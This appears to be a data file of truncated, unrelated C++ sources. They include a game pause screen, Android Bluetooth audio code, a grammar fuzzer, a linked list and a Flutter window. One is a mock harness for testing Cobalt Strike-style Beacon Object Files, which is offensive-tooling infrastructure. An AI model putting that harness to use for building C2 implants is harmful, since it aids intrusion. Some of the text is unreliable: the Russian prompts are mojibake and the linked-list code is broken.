    "#include \"PauseGame.h\"\n\n\nPauseGame::PauseGame(std::shared_ptr<Context>& context) : m_context{ context }, m_SoundArea { 100, 100, 64, 64 } {\n\n}\n\nPauseGame::~PauseGame() {\n\n}\n\n\nvoid PauseGame::Init() {\n\t// Title\n\tm_PauseTitle.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\tm_PauseTitle.setString(\"Paused\");\n\tfloat text_x = m_PauseTitle.getLocalBounds().width;\n\tfloat text_y = m_PauseTitle.getLocalBounds().height;\n\tm_PauseTitle.setPosition(sf::Vector2f((m_context->m_window->getSize().x / 2) - text_x / 2,\n\t\t((m_context->m_window->getSize().y / 2) - text_y / 2)));\n\tm_PauseTitle.setCharacterSize(40);\n\tm_MusicEna.setTexture(m_context->m_Assets->Get_Texture(MUSICENA));\n\tm_MusicEna.setPosition(sf::Vector2f(100, 100));\n\tm_MusicDis.setTexture(m_context->m_Assets->Get_Texture(MUSICDIS));\n\tm_MusicDis.setPosition(sf::Vector2f(100, 100));\n\n}\n\nvoid PauseGame::ProcessInput() {\n\tsf::Event ev;\n\twhile (m_context->m_window->pollEvent(ev)) {\n\t\tif (ev.type == sf::Event::Closed)\n\t\t\tm_context->m_window->close();\n\t\telse if (ev.type == sf::Event::KeyPressed) {\n\t\t\tswitch (ev.key.code) {\n\t\t\t\tcase sf::Keyboard::Escape: {\n\t\t\t\t\tthis->m_context->m_States->Pop_Current();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse if (ev.type == sf::Event::MouseButtonPressed) {\n\t\t\tif (ev.mouseButton.button == sf::Mouse::Left) {\n\t\t\t\t// checking mouse position\n\t\t\t\tsf::Vector2i mousePosition = sf::Mouse::getPosition(*m_context->m_window);\n\t\t\t\tif (m_SoundArea.contains(mousePosition)) {\n\t\t\t\t\tm_context->isMusicEna ^= 0x1;\n\t\t\t\t\tif (m_context->isMusicEna) {\n\t\t\t\t\t\tm_BGS.play();\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tm_BGS.pause();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid PauseGame::Update(sf::Time deltaTime) {\n\n}\n\nvoid PauseGame::Render() {\n\tif (m_context->isMusicEna) {\n\t\tm_context->m_window->draw(m_MusicEna);\n\t}\n\telse {\n\t\tm_context->m_window->draw(m_MusicDis);\n\t}\n\n\tm_context->m_window->draw(m_PauseTitle);\n\tm_context->m_window->display();\n}\n",
    "#include <iostream>\n#include <cstdio>\n#include <vector>\n#include <algorithm>\n#include <utility>\n#include <cstring>\n#include <map>\n#include <Windows.h>\n\n#include \"mock.h\"\n#include \"..\\beacon_user_data.h\"\n\nextern \"C\" {\n#ifdef _DEBUG\n#undef DECLSPEC_IMPORT\n#define DECLSPEC_IMPORT\n#endif\n#include \"..\\beacon.h\"\n}\n\nnamespace bof {\n    namespace utils {\n        template <typename T>\n        T swapEndianness(T value) {\n            char *ptr = reinterpret_cast<char *>(&value);\n            std::reverse(ptr, ptr + sizeof(T));\n            return value;\n        }\n\n        template <typename T>\n        std::vector<char> toBytes(T input) {\n            char *ptr = reinterpret_cast<char *>(&input);\n            return std::vector<char>(ptr, ptr + sizeof(T));\n        }\n\n        const char* typeToStr(int callbackType) {\n            switch (callbackType) {\n                case CALLBACK_OUTPUT: return \"CALLBACK_OUTPUT\";\n                case CALLBACK_OUTPUT_OEM: return \"CALLBACK_OUTPUT_OEM\";\n                case CALLBACK_ERROR: return \"CALLBACK_ERROR\";\n                case CALLBACK_OUTPUT_UTF8: return \"CALLBACK_OUTPUT_UTF8\";\n                default: return \"CALLBACK_UNKOWN\";\n            }\n        }\n    }\n\n    namespace mock {\n        char *BofData::get() {\n            return size() > 0 ? reinterpret_cast<char *>(&data[0]) : nullptr;\n        }\n\n        int BofData::size() {\n            return data.size();\n        }\n\n        void BofData::addData(const char *buf, std::size_t len) {\n            std::vector<char> bytes;\n            bytes.assign(buf, buf + len);\n            insert(static_cast<int>(len));\n            append(bytes);\n        }\n\n        void BofData::append(const std::vector<char> &data) {\n            this->data.insert(std::end(this->data), std::begin(data), std::end(data));\n        }\n\n        void BofData::insert(int v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(short v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(unsigned int v) {\n            insert(static_cast<int>(v));\n        }\n\n        void BofData::insert(unsigned short v) {\n            insert(static_cast<short>(v));\n        }\n\n        void BofData::insert(const char *v) {\n            addData(v, std::strlen(v) + 1);\n        }\n\n        void BofData::insert(const wchar_t *v) {\n            addData((const char *)v, (std::wcslen(v) + 1) * sizeof(wchar_t));\n        }\n\n        void BofData::insert(const std::vector<char>& data) {\n            pack<int32_t>(data.size());\n            append(data);\n        }\n    }\n\n    namespace output {\n        std::vector<OutputEntry> outputs;\n\n        void addEntry(int type, const char* data, int len) {\n            OutputEntry output = {\n                type,\n                std::string(data, data + len)\n            };\n            outputs.push_back(output);\n        }\n\n        const std::vector<OutputEntry>& getOutputs() {\n            return outputs;\n        }\n\n        void reset() {\n            outputs.clear();\n        }\n\n        void PrintTo(const OutputEntry& o, std::ostream* os) {\n            *os << \"{ callbackType: \" << bof::utils::typeToStr(o.callbackType) << \", output: \" << o.output << \" }\";\n        }\n    }\n\n    namespace valuestore {\n        std::map<std::string, void*> values;\n\n        void reset() {\n            values.clear();\n        }\n    }\n\n    namespace bud {\n        char custom[BEACON_USER_DATA_CUSTOM_SIZE] = { 0 };\n\n        void reset() {\n            std::memset(custom, 0, BEACON_USER_DATA_CUSTOM_SIZE);\n        }\n\n        void set(const char* data) {\n            if (data) {\n                std::memcpy(custom, data, BEACON_USER_DATA_CUSTOM_SIZE);\n            }\n        }\n    }\n}\n\nextern \"C\"\n{\n    // Print API\n    void BeaconPrintf(int type, char *fmt, ...) {\n        printf(\"[Output Callback: %s (0x%X)]\\n\", bof::utils::typeToStr(type), type);\n        va_list args;\n        va_start(args, fmt);\n        int size = vsnprintf(nullptr, 0, fmt, args);\n        if (size >= 0) {\n            char* buffer = new char[size + 1];\n            vsnprintf(buffer, size + 1, fmt, args);\n            bof::output::addEntry(type, buffer, size);\n            delete[] buffer;\n        }\n        vprintf(fmt, args);\n        printf(\"\\n\");\n        va_end(args);\n    }\n\n    void BeaconOutput(int type, char *data, int len) {\n        bof::output::addEntry(type, data, len);\n        printf(\"[Output Callback: %s (0x%X)]\\n%.*s\", bof::utils::typeToStr(type), type, len, data);\n    }\n\n    // Parser API\n    void BeaconDataParse(datap *parser, char *buffer, int size) {\n        parser->buffer = buffer;\n        parser->original = buffer;\n        parser->size = size;\n        parser->length = size;\n    }\n\n    int BeaconDataInt(datap *parser) {\n        int value = *(int *)(parser->buffer);\n        parser->buffer += sizeof(int);\n        parser->length -= sizeof(int);\n        return bof::utils::swapEndianness(value);\n    }\n\n    short BeaconD",
    "/*\n * Copyright (C) 2022 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <sys/types.h>\n#define LOG_TAG \"BTAudioSessionAidl\"\n\n#include <android-base/logging.h>\n#include <android-base/stringprintf.h>\n#include <android/binder_manager.h>\n\n#include \"BluetoothAudioSession.h\"\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace bluetooth {\nnamespace audio {\n\nstatic constexpr int kFmqSendTimeoutMs = 1000;  // 1000 ms timeout for sending\nstatic constexpr int kFmqReceiveTimeoutMs =\n    1000;                               // 1000 ms timeout for receiving\nstatic constexpr int kWritePollMs = 1;  // polled non-blocking interval\nstatic constexpr int kReadPollMs = 1;   // polled non-blocking interval\n\nBluetoothAudioSession::BluetoothAudioSession(const SessionType& session_type)\n    : session_type_(session_type), stack_iface_(nullptr), data_mq_(nullptr) {}\n\n/***\n *\n * Callback methods\n *\n ***/\n\nvoid BluetoothAudioSession::OnSessionStarted(\n    const std::shared_ptr<IBluetoothAudioPort> stack_iface,\n    const DataMQDesc* mq_desc, const AudioConfiguration& audio_config,\n    const std::vector<LatencyMode>& latency_modes) {\n  std::lock_guard<std::recursive_mutex> guard(mutex_);\n  if (stack_iface == nullptr) {\n    LOG(ERROR) << __func__ << \" - SessionType=\" << toString(session_type_)\n               << \", IBluetoothAudioPort Invalid\";\n  } else if (!UpdateAudioConfig(audio_config)) {\n    LOG(ERROR) << __func__ << \" - SessionType=\" << toString(session_type_)\n               << \", AudioConfiguration=\" << audio_config.toString()\n               << \" Invalid\";\n  } else if (!UpdateDataPath(mq_desc)) {\n    LOG(ERROR) << __func__ << \" - SessionType=\" << toString(session_type_)\n               << \" MqDescriptor Invalid\";\n    audio_config_ = nullptr;\n  } else {\n    stack_iface_ = stack_iface;\n    latency_modes_ = latency_modes;\n    LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n              << \", AudioConfiguration=\" << audio_config.toString();\n    ReportSessionStatus();\n  }\n}\n\nvoid BluetoothAudioSession::OnSessionEnded() {\n  std::lock_guard<std::recursive_mutex> guard(mutex_);\n  bool toggled = IsSessionReady();\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_);\n  audio_config_ = nullptr;\n  stack_iface_ = nullptr;\n  UpdateDataPath(nullptr);\n  if (toggled) {\n    ReportSessionStatus();\n  }\n}\n\n/***\n *\n * Util methods\n *\n ***/\n\nconst AudioConfiguration BluetoothAudioSession::GetAudioConfig() {\n  std::lock_guard<std::recursive_mutex> guard(mutex_);\n  if (!IsSessionReady()) {\n    switch (session_type_) {\n      case SessionType::A2DP_HARDWARE_OFFLOAD_ENCODING_DATAPATH:\n      case SessionType::A2DP_HARDWARE_OFFLOAD_DECODING_DATAPATH:\n        return AudioConfiguration(CodecConfiguration{});\n      case SessionType::LE_AUDIO_HARDWARE_OFFLOAD_ENCODING_DATAPATH:\n      case SessionType::LE_AUDIO_HARDWARE_OFFLOAD_DECODING_DATAPATH:\n        return AudioConfiguration(LeAudioConfiguration{});\n      case SessionType::LE_AUDIO_BROADCAST_HARDWARE_OFFLOAD_ENCODING_DATAPATH:\n        return AudioConfiguration(LeAudioBroadcastConfiguration{});\n      default:\n        return AudioConfiguration(PcmConfiguration{});\n    }\n  }\n  return *audio_config_;\n}\n\nvoid BluetoothAudioSession::ReportAudioConfigChanged(\n    const AudioConfiguration& audio_config) {\n  if (session_type_ !=\n          SessionType::LE_AUDIO_HARDWARE_OFFLOAD_ENCODING_DATAPATH &&\n      session_type_ !=\n          SessionType::LE_AUDIO_HARDWARE_OFFLOAD_DECODING_DATAPATH) {\n    return;\n  }\n  std::lock_guard<std::recursive_mutex> guard(mutex_);\n  audio_config_ = std::make_unique<AudioConfiguration>(audio_config);\n  if (observers_.empty()) {\n    LOG(WARNING) << __func__ << \" - SessionType=\" << toString(session_type_)\n                 << \" has NO port state observer\";\n    return;\n  }\n  for (auto& observer : observers_) {\n    uint16_t cookie = observer.first;\n    std::shared_ptr<struct PortStatusCallbacks> cb = observer.second;\n    LOG(INFO) << __func__ << \" for SessionType=\" << toString(session_type_)\n              << \", bluetooth_audio=0x\"\n              << ::android::base::StringPrintf(\"%04x\", cookie);\n    if (cb->audio_configuration_changed_cb_ != nullptr) {\n      cb->audio_configuration_changed_cb_(cookie);\n    }\n  }\n}\n\nbool BluetoothAudioSession::IsSessionReady() {\n  std::lock_guard<std::recursive_mutex> guard(mutex_);\n\n  bool is_mq_valid =\n      (session_type_ == SessionType::A2DP_HARDWARE_OFFLOAD_ENCO",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if (this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\nvoid compile(string file, bool show)\n    {\n        string code = R\"(#include<stdio.h>\n#include<string.h>\n#include<time.h>\n#include<stdlib.h>\n#define next(l)\\\n    seed ^= seed <<13;\\\n    seed ^= seed >>17;\\\n    seed ^= seed <<5;\\\n    branch = seed%l\n\n\n#define BUFFER_SIZE 512*1024*1024\n\n#define extend(c)\\\n    (buffer).data[(buffer).top++] = c;\n\n#define clean()\\\n    buffer.top = 0\n     \n#define printbuff()\\\n    for (int i = 0; i < (buffer).top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n')\n    \ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\nBuffer buffer;\n\nunsigned branch;\nunsigned cursor;\nunsigned seed;\n)\";\n        code += \"#define MAXDEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        // creat signature\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            code += \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth);\\n\";\n        }\n\n        string functions = \"\";\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            string function = \"\";\n            string functionname = \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth){\\n\";\n            string body = \"\";\n            if (nodes[i]->tp == Type::terminal)\n            {\n                for (int j = 0; j < nodes[i]->name.size(); j++)\n                {\n                    body += \"    extend(\" + to_string((unsigned)nodes[i]->name[j]) + \");\\n\";\n                }\n            }\n            else if (nodes[i]->tp == Type::non_terminal)\n            {\n                body += \"    if(depth>MAXDEPTH){\\n\";\n                for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                {\n                    body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                }\n                body += \"        return;\\n\";\n                body += \"    }\\n\";\n                body += \"    next(\" + to_string(nodes[i]->subnode.size()) + \");\\n\";\n                body += \"    switch(branch){\\n\";\n                for (int j = 0; j < nodes[i]->subnode.size(); j++)\n                {\n                    body += \"       case \" + to_string(j) + \":\\n\";\n                    body += \"           func_\" + to_string(reinterpret_cast<uintptr_t>(nodes[i]->subnode[j])) + \"(depth+1);\\n           break;\\n\";\n                }\n                body += \"    }\\n\";\n            }\n            else if (nodes[i]->tp == Type::expression)\n            {\n                // body += \"    if(depth>MAXDEPTH){\\n\";\n                // for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                // {\n                //     body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                // }\n                // body += \"        return;\\n\";\n                // body += \"    }\\n\";\n             ",
    "\n\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint noMhs;\n\tstring name;\n\tNode *next;\n\tNode *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode() \n{\n\tNode* newNode = new Node(); // step 1: create a new node\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;// assign value to the data field of the new node\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name; // Assign the value to the data field of the new node\n\n// Insert the new node in the list\n\tif (START == NULL || newNode->noMhs == START->noMhs)\n\t{// step 2: insert the mew node at the beginning\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs)\n\t\t{\n\t\t\tcout << \"\\033[31mDuplicate roll number not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t// if the list is empty, make the new node to START\n\t\tnewNode->next = START; // step 3: make the new node point to the first node\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = newNode; // step 4 : make the first node point to the new node\n\t\t}\n\t\tnewNode->prev = NULL; // step 5: make the new node point to NULL\n\t\tSTART = newNode; // step 6 : make the new node the first node\n\t}\n\telse\n\t{\n\t// insert the new node in the middle or at the end\n\t\tNode *current = START; // step 1.a: start from the first node\n\t\tNode* previous = NULL; // step 1.b: previous node is NULL initially\n\n\t\twhile(current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\t\t\t\t\t\t\t// step 1.c : traverse the list to find the correct position\n\t\t\tprevious = current;\t\t// step 1.d : move the previous to the current node\n\t\t\tcurrent = current->next;// step 1.e : move the current to the noext node\n\t\t}\n\n\t\tnewNode->next = current; // step 1: Make the next field of the new node point to current.\n\t\tnewNode->prev = previous; // step 5: Make the previous field of the new node point to previous.\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode; // step 6: Make the previous field of the current node point to the new node\n\t\t}\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode; // step 7: Make the next fieldof the previous node point to the new node.\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// if previous is still NULL, its means newNode is now the first node\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\n\nbool search(int rollNo, Node **previous,  Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; //\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // 3: get the roll number to be deleted\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // step 1 : start from the first node\n\tprevious = NULL;\n\n\t// locate the node to be deleted\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node\n\tif (current == START)\n\t{\n\t\tSTART = START->next; // step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL; // step\n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first Node\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{ // if there's a succesor, update its prev pointer\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\tNode* currentNode = START;\n\twhile (currentNode != NULL)\n\t{\n\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\n\n\nint main()\n{\n\n}\n\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <regex>\n#include <iostream>\n#include \"constants.h\"\n\n#include \"utils.h\"\n#include <fstream>\n\nusing namespace std;\n\nint task() {\n\tregex valid_input(\"^[01]$\");\n\t\n\tstring input;\n\tchar in_option, out_option;\n\tint matrix_n, matrix_m;\n\n\tdo {\n\t\tdo {\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00e2\u00e2\u00ee\u00e4\u00e0 \u00f1 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8, '1' \u00e4\u00eb\u00ff \u00e2\u00e2\u00ee\u00e4\u00e0 \u00e8\u00e7 \u00f4\u00e0\u00e9\u00eb\u00e0: \";\n\t\t\tgetline(cin, input);\n\t\t} while (!regex_match(input, valid_input));\n\t\tin_option = input[0];\n\n\t\tdo {\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00e2\u00fb\u00e2\u00ee\u00e4\u00e0 \u00ed\u00e0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc, '1' \u00e4\u00eb\u00ff \u00e2\u00fb\u00e2\u00ee\u00e4\u00e0 \u00e2 \u00f4\u00e0\u00e9\u00eb: \";\n\t\t\tgetline(cin, input);\n\t\t} while (!regex_match(input, valid_input));\n\t\tout_option = input[0];\n\n\t\tif (in_option == '0') {\n\t\t\treadFromConsole(matrix_n, matrix_m);\n\t\t}\n\t\telse if (in_option == '1') {\n\t\t\tif (!readFromFile(constants::input, matrix_n, matrix_m)) {\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\n\t\tdouble** matrix = new double* [matrix_n];\n\t\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\t\tmatrix[i] = new double[matrix_m];\n\t\t}\n\t\t\n\t\tfor (int i{ 0 }; i < matrix_m; i++){\n\t\t\tmatrix[0][i] = 2 * (i + 1) + 3;\n\t\t}\n\t\t\n\t\tif (matrix_n >= 2) {\n\t\t\tfor (int i{ 0 }; i < matrix_m; i++){\n\t\t\t\tmatrix[1][i] = (i + 1) - (3 / (2 + 1. / (i + 1)));\n\t\t\t}\n\t\t}\n\n\t\tfor (int i{2}; i < matrix_n; i++) {\n\t\t\tfor (int j{ 0 }; j < matrix_m; j++) {\n\t\t\t\tmatrix[i][j] = matrix[i - 1][j] + matrix[i - 2][j];\n\t\t\t}\n\t\t}\n\n\t\tif (out_option == '0') {\n\t\t\tprintConsole(matrix, matrix_n, matrix_m);\n\t\t}\n\t\telse if (out_option == '1'){\n\t\t\twriteToFile(constants::output, matrix, matrix_n, matrix_m);\n\t\t}\n\n\t\tfreeMatrix(matrix, matrix_n);\n\t\tif (in_option == '0') {\n\t\t\tdo {\n\t\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00ef\u00ee\u00e2\u00f2\u00ee\u00f0\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb, '1' \u00e4\u00eb\u00ff \u00e7\u00e0\u00e2\u00e5\u00f0\u00f8\u00e5\u00ed\u00e8\u00ff \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb: \";\n\t\t\t\tgetline(cin, input);\n\t\t\t} while (!regex_match(input, 